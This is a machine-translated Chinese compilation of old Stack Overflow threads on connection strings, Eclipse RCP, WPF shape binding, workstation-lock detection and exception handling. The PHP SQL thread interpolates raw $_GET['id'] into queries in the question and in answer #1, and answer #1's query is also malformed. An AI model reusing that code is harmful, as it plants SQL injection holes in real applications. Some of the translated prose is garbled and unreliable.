Brian Fisher 的答案是正确的，但是如果您想在代码中尝试它，还有另一种方法。只需单击数据库，转到 SQL 并键入例如以下代码：

CREATE TABLE Player（
id MEDIUMINT NOT NULL AUTO_INCREMENT，
用户名 CHAR(30) NOT NULL，
PRIMARY KEY (id)
）

说明：
MEDIUMINT：
INT，最小值为 -8388608，最大值为 8388607
，最小值为 0，最大值为 16777215

NOT NULL（两个运算符合二为一）：
此值可能永远不会为空

AUTO_INCREMENT：
*您在哪里寻找*
AUTO_INCREMENT 属性可用于为新行生成唯一标识。

# c# - 修改强类型数据集连接字符串的数据源

> ID：434815
> 
> 赞同：1
> 
> 时间：2009-01-12T08:41:26.447
> 
> 标签：c#, configuration, strongly-typed-dataset

这是与修改强类型数据集连接字符串的数据源相关的两个问题。

部署我的应用程序后，将一个轻量级数据库（以 Microsoft Access 的形式）部署到 Application Data 文件夹。我有一个围绕它的强类型数据集。所以问题是如何更改以下 app.config 代码：

```
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
    <configSections>
    </configSections>
    <connectionStrings>
        <add name="XTrace.Properties.Settings.Timer_DBConnectionString"
            connectionString="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=&quot;|DataDirectory|\Timer DB.mdb&quot;;Persist Security Info=True"
            providerName="System.Data.OleDb" />
    </connectionStrings>
</configuration> 
```

让它从应用程序数据文件夹副本中读取？

我[从 SO](https://stackoverflow.com/questions/31449/dataset-connection-strings-in-vs-2008)和其他地方读到最好使用 app.config 或 web.config 来管理连接字符串。但是由于 app.config 被编译到 Windows 窗体中，它如何提供允许在部署时更改连接字符串的灵活性？不过，我不是在谈论网络应用程序，因为我知道网络应用程序可能会分发 web.config，并且您可以从该文件中修改连接字符串。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T08:46:42.143

当您部署 Windows 窗体应用程序时，您可能有一个 app.config 文件。

yourproject.exe 为您提供了 yourproject.exe.config 文件，即 app.config 文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-12-11T14:54:42.433

与其修改 .config 文件，不如在运行时添加新的连接字符串属性并使用 TableAdapterManager。请阅读更多内容：[http ://rajmsdn.wordpress.com/2009/12/09/strongly-typed-dataset-connection-string/](http://rajmsdn.wordpress.com/2009/12/09/strongly-typed-dataset-connection-string/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-08T11:15:57.410

对于类库：app.config 中每个项目的设置也必须在 .settings 文件中更改。这意味着：如果您只更改 app.config，则必须检查 Project -> Properties。在 VS2012 中，app.config 和 .settings 文件之间的更改会立即显示出来，并提供接受这些更改的可能性。没有这个（所以只更改 app.config 文件），更改将不会生效。

设置嵌入到类库中（下面的示例），因此在引用一个时没有 .config 文件。

![具有嵌入式更改的类库](https://i.stack.imgur.com/0E5iC.jpg)

# java - RCP + JNLP\WebStart 应用程序无法启动

> ID：434818
> 
> 赞同：0
> 
> 时间：2009-01-12T08:41:58.910
> 
> 标签：java, eclipse, rcp, jnlp

我遵循了这个示例：[RCP+JavaWS](http://help.eclipse.org/help33/index.jsp?topic=/org.eclipse.platform.doc.isv/guide/java_web_start.htm)，但该应用程序只是短暂地出现并消失了。我打开了控制台，它也很快消失了。我尝试在我的 application-desc args 中添加：-console、-consoleLog 和 -noExit，但我搜索了我的 Application Data 目录但无济于事。

有谁知道我可以在哪里找到这个日志？或者，有谁知道我可以添加哪些参数以使其登录到控制台？

提前致谢。

日食 3.4
Java 1.5

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-12T09:03:02.830

使用 java 控制面板（在系统控制中的 windows 系统上）启用 Java 控制台。此设置可在扩展设置选项卡上找到。设置值以显示控制台。重新启动应用程序后，系统托盘中应出现一个 java 图标，从中可以访问控制台视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-13T04:26:55.820

我添加了以下 jar，控制台现在打开，我可以看到问题。希望这对其他人有帮助。

```
org.eclipse.update.configurator_3.2.201.R34x_v20080819.jar
org.eclipse.equinox.app_1.1.0.v20080421-2006.jar
org.eclipse.equinox.common_3.4.0.v20080421-2006.jar
org.eclipse.equinox.launcher_1.0.101.R34x_v20080819.jar
org.eclipse.equinox.preferences_3.2.201.R34x_v20080709.jar
org.eclipse.equinox.registry_3.4.0.v20080516-0950.jar
org.eclipse.osgi.services_3.1.200.v20071203.jar
org.eclipse.osgi_3.4.2.R34x_v20080826-1230.jar
org.eclipse.ui.workbench_3.4.1.M20080827-0800a.jar
org.eclipse.ui_3.4.1.M20080910-0800.jar 
```

# unit-testing - 单元测试绘图控制

> ID：434828
> 
> 赞同：0
> 
> 时间：2009-01-12T08:48:12.190
> 
> 标签：unit-testing, system.drawing

基于我之前的问题[，](https://stackoverflow.com/questions/427848/wpf-v-s-system-drawing)我的新问题是如何对我的绘图代码进行单元测试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T09:06:57.113

这不是最终的答案，但基本上，您可以通过将其分成小块函数来测试您的绘图代码，其中一些可能有可测试的结果（不是图像）。

对于直接在渲染上工作的函数，没有太多选择来编写它们并在第一次直观地检查它们的输出。

一旦有了*参考输出*，您就可以将其用作测试的输入，并检查您的函数是否会随着函数的发展继续产生参考输出。当然，你的函数越简单，你就越能检查它的输出，看看有什么问题。

这不是真正的单元测试，但无论如何这都是很好的测试。

# sql - SQL加入也许？

> ID：434829
> 
> 赞同：1
> 
> 时间：2009-01-12T08:48:47.490
> 
> 标签：sql, join

$query = mysql_query("SELECT * FROM news WHERE id = '{$_GET['id']}'"); $news = mysql_fetch_assoc($query);

$sql84 = mysql_query("SELECT username FROM users WHERE id = '".$news['user_id']."'") 或 exit(mysql_error()); $author = mysql_fetch_array($sql84);

我有更好的方法吗？也许加入？看起来怎么样

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T08:52:12.913

看起来你想要这样的东西：

（编辑添加错误检查）

```
$q = "select username from news, users where news.user_id=users.id and news.id=".$_GET['id'].");";
$query = mysql_query($q) or die(mysql_error()); 
```

本

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T08:51:41.120

```
$query = mysql_query("SELECT n.*, u.* FROM news n LEFT JOIN users u ON u.id=n.user_id WHERE n.id = ".intval($_GET['id'])); 
```

如果假定值为数字，请不要忘记使用 intval()。

# vbscript - 如何检查我的工作站是否被锁定？

> ID：434830
> 
> 赞同：1
> 
> 时间：2009-01-12T08:48:56.150
> 
> 标签：vbscript

任何人都可以帮助检查工作站是否被锁定的代码片段吗？我尝试获取document.title，这样当工作站被锁定时，它会为document.title返回空白。这是行不通的。

我在驻留在 HTML 中的 vbscript 中对 wscript 进行编码。

对 Javascript 的任何帮助也很好。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2011-01-21T01:40:04.537

通常您应该使用 wmi 查询来查看事件日志的安全日志。但是，XP 没有锁定事件 ID（vista/win7/2008 确实同时具有锁定和解锁事件 ID）。

XP 确实有一个解锁事件，但事件。大多数人没有意识到解锁事件涉及登录/注销事件（事件 ID 528/538，几乎同时发生）。登录类型将为 EventType 7，这就是您告诉某人正在解锁工作站的方式。登录类型 7（无论是登录还是注销）是解锁事件。

对于 Vista/Win7/2008，新的工作站锁定事件 id 是 4800，而确定解锁事件的更新方法是事件 id 4801。但是，Vista 操作系统后的源日志不是安全日志，而是 Microsoft-Windows-Security -审核日志。

如果你有 Win7 你的运气，应该只写一个 wmi 查询。XP，我看不出有什么好的方法，除非你想试试空闲时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-11T11:15:29.403

一个有效的指标（在具有单个用户且没有远程桌面的 Windows 7 SP1 上）是检查进程是否存在，该`LogonUI.exe`进程仅在工作站被锁定时才存在。请参阅以下内容`islocked.vbs`，也可以传递远程计算机名称。

```
' Source:
'   http://community.spiceworks.com/scripts/show/1965-detect-screen-lock-status
Dim computer : computer = "."
If WScript.Arguments.Count = 1 Then
    computer = WScript.Arguments(0)
End If

Function IsWorkstationLocked( computer )
    Dim wmi : Set wmi = GetObject("winmgmts://" & computer & "/root/cimv2")
    Dim logonScreenCount : logonScreenCount = wmi.ExecQuery ("SELECT * FROM Win32_Process WHERE Name = 'LogonUI.exe'").Count

    IsWorkstationLocked = (logonScreenCount > 0)
End Function

If IsWorkstationLocked(computer) Then
    WScript.Quit(0)
Else
    WScript.Quit(1)
End If 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T09:00:47.593

不确定您是否可以通过脚本检查。大多数功能将按预期运行。一件行不通的事情是发送键（模拟按键或鼠标移动），但你不能从 html 上的脚本中做到这一点。
也许您可以检查自用户上次活动以来的空闲时间？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-02T03:19:33.660

如果有屏幕保护程序，您可能会看到类似“logon.scr”的进程。但是，如果您没有运行屏幕保护程序，那将无法正常工作。[尽管使用此](http://www.inquiry.com/techtips/nt_pro/10_minute_solutions/10minNT0701.asp)代码，但使用 .Net 非常容易。

您可以将其创建为 COM 对象并从 VBScript 调用它。

# wpf - WPF 形状矩形绑定

> ID：434832
> 
> 赞同：2
> 
> 时间：2009-01-12T08:50:07.817
> 
> 标签：wpf, binding, shape, rect

我正在尝试在 wpf 中制作某种形状，它会根据内容（应该是文本）调整自身大小。不幸的是，stretch 属性不是正确的，因为我只想要调整形状的宽度并且**没有**边框（请复制 xamlpad 中的底部示例以自己查看）拉伸的形状。边界应该保持原样，或者至少在统一中缩放。我尝试了很多想法。在网格、堆栈面板或剪切面板等中使用不同的形状切片。我的下一个方法是以下方法：

```
<Page xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"><Page.Resources>
<LinearGradientBrush StartPoint="0.0,1" EndPoint="0.0,0" x:Key="brushYellow">
  <LinearGradientBrush.GradientStops>
    <GradientStop Offset="0.000000" Color="#fffef4a6"/>
    <GradientStop Offset="0.175824" Color="#fffef9d6"/>
    <GradientStop Offset="0.800000" Color="#fffef9d6"/>
    <GradientStop Offset="1.000000" Color="#fffef4a6"/>
  </LinearGradientBrush.GradientStops>
</LinearGradientBrush></Page.Resources><Grid>
 <Path Stroke="#fffce90d" StrokeThickness="1" Fill="{StaticResource brushYellow}">
    <Path.Data>
      <CombinedGeometry GeometryCombineMode="Exclude">
        <CombinedGeometry.Geometry1>
          <RectangleGeometry RadiusX="15" RadiusY="15">
            <!--RectangleGeometry.Rect>
              <Binding StringFormat="{}{0 0 {0} 82}" ElementName="Text" Path="Width"/>
            </RectangleGeometry.Rect-->
            <RectangleGeometry.Rect>
              <Rect Width="150" Height="82"/>
            </RectangleGeometry.Rect>
          </RectangleGeometry>
        </CombinedGeometry.Geometry1>
        <CombinedGeometry.Geometry2>
          <PathGeometry>
            <PathGeometry.Figures>
              <PathFigureCollection>
                <PathFigure IsClosed="True" StartPoint="0,15">
                  <PathFigure.Segments>
                    <PathSegmentCollection>
                      <LineSegment Point="17,41" />
                      <LineSegment Point="0,67" />
                    </PathSegmentCollection>
                  </PathFigure.Segments>
                </PathFigure>
              </PathFigureCollection>
            </PathGeometry.Figures>
          </PathGeometry>
        </CombinedGeometry.Geometry2>
      </CombinedGeometry>
    </Path.Data>
  </Path>
  <TextBox Name="Text" Background="Transparent" BorderThickness="0" MinWidth="150" Margin="0"/>
</Grid></Page> 
```

这将在 xamlpad 中开箱即用。第 19 行未注释的部分是我真正想要实现的：将 Rectangle 的 Rect 绑定到其他东西。不幸的是，Rect 的宽度不是 dp，这就是为什么我直接使用字符串格式化的 Binding 到 Rect 本身。

正如生活所期望的那样，这不起作用（什么都看不到）：D我在这里做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T11:08:34.090

您可以尝试使用变换来更改矩形的大小，而不是直接绑定矩形的宽度。我认为这应该有效。

例如，在您的**RectangleGeometry**标签中添加这样的内容：

```
<RectangleGeometry.Transform>
    <ScaleTransform ScaleX="{Binding ElementName=textBoxName, Path=Width, 
        Converter=MyScaleWidthConverter}" />
</RectangleGeometry.Transform> 
```

其中*textBoxName*是您的文本框的名称。无法让自己称之为文本 - 太混乱了。

您将需要提供一个转换器以确保缩放正确 - 例如，您可能希望在给定示例代码的情况下返回**Width / 150之类的内容。**

当在 Visual Studio 设计器中将矩形的宽度设置为 Auto 时，我看到了一些奇怪的行为——我认为这可能是设计器的怪癖。转换器在运行时连接后应该可以工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T13:28:56.757

用你的路径作为画笔怎么样？在下面的代码中，我使用 DrawingBrush 作为 TextBox 本身的背景或作为封闭边框的背景。只是一个提示......希望这会有所帮助。

```
<Window x:Class="MarkupWpf.BrushTest"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="BrushTest" Height="300" Width="300">
    <Window.Resources>
        <LinearGradientBrush StartPoint="0.0,1" EndPoint="0.0,0" x:Key="brushYellow">
            <LinearGradientBrush.GradientStops>
                <GradientStop Offset="0.000000" Color="#fffef4a6"/>
                <GradientStop Offset="0.175824" Color="#fffef9d6"/>
                <GradientStop Offset="0.800000" Color="#fffef9d6"/>
                <GradientStop Offset="1.000000" Color="#fffef4a6"/>
            </LinearGradientBrush.GradientStops>
        </LinearGradientBrush>
        <DrawingBrush x:Key="FabBrush">
            <DrawingBrush.Drawing>
                <GeometryDrawing Brush="{StaticResource brushYellow}">
                    <GeometryDrawing.Pen>
                        <Pen Thickness="1" Brush="#fffce90d" />
                    </GeometryDrawing.Pen>
                    <GeometryDrawing.Geometry>
                        <CombinedGeometry GeometryCombineMode="Exclude">
                            <CombinedGeometry.Geometry1>
                                <RectangleGeometry RadiusX="15" RadiusY="15">
                                    <RectangleGeometry.Rect>
                                        <Rect Width="150" Height="82"/>
                                    </RectangleGeometry.Rect>
                                </RectangleGeometry>
                            </CombinedGeometry.Geometry1>
                            <CombinedGeometry.Geometry2>
                                <PathGeometry>
                                    <PathGeometry.Figures>
                                        <PathFigureCollection>
                                            <PathFigure IsClosed="True" StartPoint="0,15">
                                                <PathFigure.Segments>
                                                    <PathSegmentCollection>
                                                        <LineSegment Point="17,41" />
                                                        <LineSegment Point="0,67" />
                                                    </PathSegmentCollection>
                                                </PathFigure.Segments>
                                            </PathFigure>
                                        </PathFigureCollection>
                                    </PathGeometry.Figures>
                                </PathGeometry>
                            </CombinedGeometry.Geometry2>
                        </CombinedGeometry>
                    </GeometryDrawing.Geometry>
                </GeometryDrawing>
            </DrawingBrush.Drawing>
        </DrawingBrush>
    </Window.Resources>
    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition />
            <RowDefinition />
        </Grid.RowDefinitions>
        <TextBox Grid.Row="0" Background="{StaticResource FabBrush}" BorderThickness="0" MinWidth="150" Margin="0"/>
        <Grid Grid.Row="1">
            <Border Background="{StaticResource FabBrush}">
                <TextBox Grid.Row="0" BorderThickness="0" MinWidth="150" Margin="20" />
            </Border>
        </Grid>
    </Grid>
</Window> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-11-19T09:02:22.577

我使用了一组名为 ViewboxPath、ViewboxLine、ViewboxPolyline 等的类，它们将 Shape 的拉伸语义更改为更易于处理。我不确定我是否理解你的问题，所以我不知道我的技术是否能解决你的问题。

当我读到它时，要么你想控制这个解决方案将提供的拉伸，要么你想让笔触与图像一起拉伸，Sam 的回答将提供。

无论如何，下面是这些类的代码，这就是你如何使用它们：

```
<edf:ViewboxPolyline
    Viewbox="0 0 1 1"  <!-- Actually the default, can be omitted -->
    Stretch="Fill"     <!-- Also default, can be omitted -->
    Stroke="Blue"
    Points="0,0 0.2,0 0.2,0.3 0.4,0.3" />

<edf:ViewboxPolygon
    Viewbox="0 0 10 10"
    Stroke="Blue"
    Points="5,0 10,5 5,10 0,5" />

<edf:ViewboxPath
    Viewbox="0 0 10 10"
    Stroke="Blue"
    Data="M10,5 L4,4 L5,10" /> 
```

我的**Viewbox 形状类**的使用与普通形状（`Polyline`、和）一样`Polygon`，除了额外参数以及它们默认为. Viewbox 参数在用于指定形状的坐标系中指定应使用或设置而不是使用拉伸的几何图形区域。`Path``Line``Viewbox``Stretch="Fill"``Fill``Uniform``UniformToFill``Geometry.GetBounds`

这可以非常精确地控制拉伸，并使单独的形状彼此准确对齐变得容易。

这是我的**Viewbox shape classes**`ViewboxShape`的实际代码，包括包含通用功能的抽象基类：

```
public abstract class ViewboxShape : Shape
{
  Matrix _transform;
  Pen _strokePen;
  Geometry _definingGeometry;
  Geometry _renderGeometry;

  static ViewboxShape()
  {
    StretchProperty.OverrideMetadata(typeof(ViewboxShape), new FrameworkPropertyMetadata
    {
      AffectsRender = true,
      DefaultValue = Stretch.Fill,
    });
  }

  // The built-in shapes compute stretching using the actual bounds of the geometry.
  // ViewBoxShape and its subclasses use this Viewbox instead and ignore the actual bounds of the geometry.
  public Rect Viewbox { get { return (Rect)GetValue(ViewboxProperty); } set { SetValue(ViewboxProperty, value); } }
  public static readonly DependencyProperty ViewboxProperty = DependencyProperty.Register("Viewbox", typeof(Rect), typeof(ViewboxShape), new UIPropertyMetadata
  {
    DefaultValue = new Rect(0,0,1,1),
  });

  // If defined, replaces all the Stroke* properties with a single Pen
  public Pen Pen { get { return (Pen)GetValue(PenProperty); } set { SetValue(PenProperty, value); } }
  public static readonly DependencyProperty PenProperty = DependencyProperty.Register("Pen", typeof(Pen), typeof(Pen), new UIPropertyMetadata
  {
    DefaultValue = null
  });

  // Subclasses override this to define geometry if caching is desired, or just override DefiningGeometry
  protected virtual Geometry ComputeDefiningGeometry()
  {
    return null;
  }

  // Subclasses can use this PropertyChangedCallback for properties that affect the defining geometry
  protected static void OnGeometryChanged(DependencyObject sender, DependencyPropertyChangedEventArgs e)
  {
    var shape = sender as ViewboxShape;
    if(shape!=null)
    {
      shape._definingGeometry = null;
      shape._renderGeometry = null;
    }
  }

  // Compute viewport from box & constraint
  private Size ApplyStretch(Stretch stretch, Rect box, Size constraint)
  {
    double uniformScale;
    switch(stretch)
    {
      default:
        return new Size(box.Width, box.Height);

      case Stretch.Fill:
        return constraint;

      case Stretch.Uniform:
        uniformScale = Math.Min(constraint.Width / box.Width, constraint.Height / box.Height);
        break;

      case Stretch.UniformToFill:
        uniformScale = Math.Max(constraint.Width / box.Width, constraint.Height / box.Height);
        break;
    }
    return new Size(uniformScale * box.Width, uniformScale * box.Height);
  }

  protected override Size MeasureOverride(Size constraint)
  {
    // Clear pen cache if settings have changed
    if(_strokePen!=null)
      if(Pen!=null)
        _strokePen = null;
      else
        if(_strokePen.Thickness != StrokeThickness ||
           _strokePen.Brush != Stroke ||
           _strokePen.StartLineCap != StrokeStartLineCap ||
           _strokePen.EndLineCap != StrokeEndLineCap ||
           _strokePen.DashCap != StrokeDashCap ||
           _strokePen.LineJoin != StrokeLineJoin ||
           _strokePen.MiterLimit != StrokeMiterLimit ||
           _strokePen.DashStyle.Dashes != StrokeDashArray ||
           _strokePen.DashStyle.Offset != StrokeDashOffset)
          _strokePen = null;

    _definingGeometry = null;
    _renderGeometry = null;

    return ApplyStretch(Stretch, Viewbox, constraint);
  }

  protected override Size ArrangeOverride(Size availableSize)
  {
    Stretch stretch = Stretch;
    Size viewport;
    Matrix transform;

    // Compute new viewport and transform
    if(stretch==Stretch.None)
    {
      viewport = availableSize;
      transform = Matrix.Identity;
    }
    else
    {
      Rect box = Viewbox;
      viewport = ApplyStretch(stretch, box, availableSize);

      double scaleX = viewport.Width / box.Width;
      double scaleY = viewport.Height / box.Height;
      transform = new Matrix(scaleX, 0, 0, scaleY, -box.Left * scaleX, -box.Top * scaleY);
    }

    if(_transform!=transform)
    {
      _transform = transform;
      _renderGeometry = null;
      InvalidateArrange();
    }
    return viewport;
  }

  protected Pen PenOrStroke
  {
    get
    {
      if(Pen!=null)
        return Pen;
      if(_strokePen==null)
        _strokePen = new Pen
        {
          Thickness = StrokeThickness,
          Brush = Stroke,
          StartLineCap = StrokeStartLineCap,
          EndLineCap = StrokeEndLineCap,
          DashCap = StrokeDashCap,
          LineJoin = StrokeLineJoin,
          MiterLimit = StrokeMiterLimit,
          DashStyle =
            StrokeDashArray.Count==0 && StrokeDashOffset==0 ? DashStyles.Solid :
            new DashStyle(StrokeDashArray, StrokeDashOffset),
        };
      return _strokePen;
    }
  }

  protected Matrix Transform
  {
    get
    {
      return _transform;
    }
  }

  protected override Geometry DefiningGeometry
  {
    get
    {
      if(_definingGeometry==null)
        _definingGeometry = ComputeDefiningGeometry();
      return _definingGeometry;
    }
  }

  protected Geometry RenderGeometry
  {
    get
    {
      if(_renderGeometry==null)
      {
        Geometry defining = DefiningGeometry;
        if(_transform==Matrix.Identity || defining==Geometry.Empty)
          _renderGeometry = defining;
        else
        {
          Geometry geo = defining.CloneCurrentValue();
          if(object.ReferenceEquals(geo, defining)) geo = defining.Clone();

          geo.Transform = new MatrixTransform(
            geo.Transform==null ? _transform : geo.Transform.Value * _transform);
          _renderGeometry = geo;
        }
      }
      return _renderGeometry;
    }
  }

  protected override void OnRender(DrawingContext drawingContext)
  {
    drawingContext.DrawGeometry(Fill, PenOrStroke, RenderGeometry);
  }

}

[ContentProperty("Data")]
public class ViewboxPath : ViewboxShape
{
  public Geometry Data { get { return (Geometry)GetValue(DataProperty); } set { SetValue(DataProperty, value); } }
  public static readonly DependencyProperty DataProperty = DependencyProperty.Register("Data", typeof(Geometry), typeof(ViewboxPath), new UIPropertyMetadata
  {
    DefaultValue = Geometry.Empty,
    PropertyChangedCallback = OnGeometryChanged,
  });

  protected override Geometry DefiningGeometry
  {
    get { return Data ?? Geometry.Empty; }
  }
}

public class ViewboxLine : ViewboxShape
{
  public double X1 { get { return (double)GetValue(X1Property); } set { SetValue(X1Property, value); } }
  public double X2 { get { return (double)GetValue(X2Property); } set { SetValue(X2Property, value); } }
  public double Y1 { get { return (double)GetValue(Y1Property); } set { SetValue(Y1Property, value); } }
  public double Y2 { get { return (double)GetValue(Y2Property); } set { SetValue(Y2Property, value); } }
  public static readonly DependencyProperty X1Property = DependencyProperty.Register("X1", typeof(double), typeof(ViewboxLine), new FrameworkPropertyMetadata { PropertyChangedCallback = OnGeometryChanged, AffectsRender = true });
  public static readonly DependencyProperty X2Property = DependencyProperty.Register("X2", typeof(double), typeof(ViewboxLine), new FrameworkPropertyMetadata { PropertyChangedCallback = OnGeometryChanged, AffectsRender = true });
  public static readonly DependencyProperty Y1Property = DependencyProperty.Register("Y1", typeof(double), typeof(ViewboxLine), new FrameworkPropertyMetadata { PropertyChangedCallback = OnGeometryChanged, AffectsRender = true });
  public static readonly DependencyProperty Y2Property = DependencyProperty.Register("Y2", typeof(double), typeof(ViewboxLine), new FrameworkPropertyMetadata { PropertyChangedCallback = OnGeometryChanged, AffectsRender = true });

  protected override Geometry ComputeDefiningGeometry()
  {
    return new LineGeometry(new Point(X1, Y1), new Point(X2, Y2));
  }
}

[ContentProperty("Points")]
public class ViewboxPolyline : ViewboxShape
{
  public ViewboxPolyline()
  {
    Points = new PointCollection();
  }

  public PointCollection Points { get { return (PointCollection)GetValue(PointsProperty); } set { SetValue(PointsProperty, value); } }
  public static readonly DependencyProperty PointsProperty = DependencyProperty.Register("Points", typeof(PointCollection), typeof(ViewboxPolyline), new FrameworkPropertyMetadata
  {
    PropertyChangedCallback = OnGeometryChanged,
    AffectsRender = true,
  });

  public FillRule FillRule { get { return (FillRule)GetValue(FillRuleProperty); } set { SetValue(FillRuleProperty, value); } }
  public static readonly DependencyProperty FillRuleProperty = DependencyProperty.Register("FillRule", typeof(FillRule), typeof(ViewboxPolyline), new FrameworkPropertyMetadata
  {
    DefaultValue = FillRule.EvenOdd,
    PropertyChangedCallback = OnGeometryChanged,
    AffectsRender = true,
  });

  public bool CloseFigure { get { return (bool)GetValue(CloseFigureProperty); } set { SetValue(CloseFigureProperty, value); } }
  public static readonly DependencyProperty CloseFigureProperty = DependencyProperty.Register("CloseFigure", typeof(bool), typeof(ViewboxPolyline), new FrameworkPropertyMetadata
  {
    DefaultValue = false,
    PropertyChangedCallback = OnGeometryChanged,
    AffectsRender = true,
  });

  protected override Geometry  ComputeDefiningGeometry()
  {
    PointCollection points = Points;
    if(points.Count<2) return Geometry.Empty;

    var geometry = new StreamGeometry { FillRule = FillRule };
    using(var context = geometry.Open())
    {
      context.BeginFigure(Points[0], true, CloseFigure);
      context.PolyLineTo(Points.Skip(1).ToList(), true, true);
    }
    return geometry;
  }

}

public class ViewboxPolygon : ViewboxPolyline
{
  static ViewboxPolygon()
  {
    CloseFigureProperty.OverrideMetadata(typeof(ViewboxPolygon), new FrameworkPropertyMetadata
    {
      DefaultValue = true,
    });
  }
} 
```

享受！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-18T12:43:43.303

我正在做这样的事情。我想要在调整窗口大小时自动调整大小的自定义形状。对于我的解决方案，我从形状派生并覆盖了定义几何属性。对于我的形状的尺寸，我使用 ActualWidth 和 ActualHeight 属性，因为它们反映了真实的宽度和高度。我也像这样覆盖 measureOverride() 方法

```
 protected override Size MeasureOverride(Size constraint)
        {
            return this.DesiredSize;
        } 
```

我在代码中使用（就像我之前说的）actualWidth 和 actualHeight 作为最大值来生成形状。希望这可以帮助

# design-patterns - 你喜欢在哪里捕捉异常，为什么？

> ID：434839
> 
> 赞同：9
> 
> 时间：2009-01-12T08:54:08.073
> 
> 标签：design-patterns, exception, architecture, error-handling, error-reporting

你喜欢在哪里捕捉异常，为什么？

我很想看看人们觉得在哪里放置他们的 try/catch 块很有用，希望可能出现一些通用模式。我将用 C++ 发布我的两个示例答案，但任何语言都可以。

请为每个答案提供一个位置和原因。谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T09:27:14.280

不要抓住任何你没有准备好也没有能力处理的东西。

因此，[拥有顶级异常处理，](https://stackoverflow.com/questions/406385/handling-unhandled-exceptions-problem#406473 "我通常在 WinForms C# 应用程序中执行的操作示例")以您喜欢的方式对意外异常进行轰炸，然后只捕获您需要的东西（尽可能接近它可能发生的地方）以获得所需的功能。

你应该只做两件事之一：实际做一些事情来解决/解决问题，或者重新抛出一个更具描述性的异常，将捕获的异常作为其`innerException`.

编辑：如果您需要一个`finally`块（例如，释放您在代码中分配的内容）并且您对可能弹出相同逻辑的任何异常没有任何用处：只需不处理它们。相反，使用 a`catch { throw; }`将异常重新抛出到更高级别，同时保持所有异常信息不变。（或者干脆省略 catch 块，我认为/希望做同样的事情？）

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T09:04:49.143

我试图只捕获那些我可以处理的异常。

我讨厌这样的代码：

```
 String s="12";
      Integer i;
        try {
          i = Integer.parseInt(s);
        } catch(ParseException pe) {
          System.out.println("hihihihihihihi!!!);
        } 
```

我特别讨厌的是，这通常是无论如何都会中止线程，因为三行之后将访问 i 并假设 i != null。

然后，您将阅读您的堆栈跟踪并滚动并滚动并滚动日志，直到您找到第一个使其他所有内容崩溃的重大错误。

无论如何，我希望 Java 不会强迫我捕获我无法处理的异常。但我能做的是：

```
catch(Exception e) {
  throw new RuntimeException(e);
} 
```

我在函数定义中声明了很多“抛出”。

我仍然梦想着有一天 Eclipse 会在遇到未捕获的异常时自动在正确的行中打开一个调试器。那天，我的方法将打开正确的行。

在其他语言中，比如 Smalltalk，我只捕获我可以处理的错误。当输入不符合我的期望时，我很乐意抛出未捕获的异常。

这个想法是我不希望记录或记录错误。我想把它修好。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-12T08:54:38.837

我总是在 main() 中添加一个捕获作为最后的捕获：

```
int main( int argc, char** argv ) {
    try {
        Application application( argc, argv );
        return application.result();
    }
    catch ( const std::exception& exception ) {
        fprintf( stderr, "%s.\n", exception.what() );
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T08:59:57.813

在 C# 和 Java 中，我更喜欢根本不捕获异常。如果无法避免，我会立即重新抛出运行时异常。

我将始终使用所需范围最大的最贪婪的 catch 块，但始终使用最具体的异常类型。由于在 99.99% 的情况下，catch 块的结果是另一个 throw，因此我尝试将完整方法保留在 try 块中。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T09:56:34.640

我喜欢尝试将我的异常处理代码与其他代码分开，因此我通常创建一个辅助方法来执行实际逻辑，而外部方法只处理异常处理。我一直认为这使代码看起来更干净，并且更具可读性。

```
public void stuff() throws MyException
{
    try
    {
        tryStuff();
    }
    catch (SomeLibraryException e)
    {
        logger.log("Some message happened", e);
        throw new MyException(e);
    }
}

public void tryStuff() throws SomeLibraryException
{
   // Do things in here that could throw exceptions
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-06-23T19:23:22.260

（在我开始之前：我是一个 Java 人）
我的建议是：

1.  从异常源找到调用链上最接近的点，您可以在其中正确处理异常 - 即采取纠正措施，发出事务/操作失败的信号等。（日志本身不应被视为处理异常）所有方法处理程序和抛出者之间应该忽略异常。更喜欢未检查的异常而不是检查的异常，这样异常甚至不会出现在所有这些中间方法中。
2.  层边界和 API 应该指定它可以使用检查异常抛出的异常，因为处理这些异常是使用它的客户端层/代码合同的一部分。
3.  编写一个带有`handle(Exception e)`方法的异常处理程序类，并最初将其发布给团队，并确保每个人都使用它来处理异常。根据不断变化的异常处理场景，稍后继续添加重载的“处理”方法，以便只修改处理程序。
4.  在进行 catch-and-throw 时，请始终记住链接异常。这可确保报告异常的全部原因。
5.  切勿多次记录相同的异常跟踪。这使得使用日志文件进行调试变得非常困难。
6.  顶级方法应该有一个 catch 子句，它将捕获系统可能抛出的*任何异常。*如果在生产环境中出现问题，这可以防止我们的内部信息泄露到外部世界。这更多的是安全要求。

* * *

## 回答 #7

> 赞同：0
> 
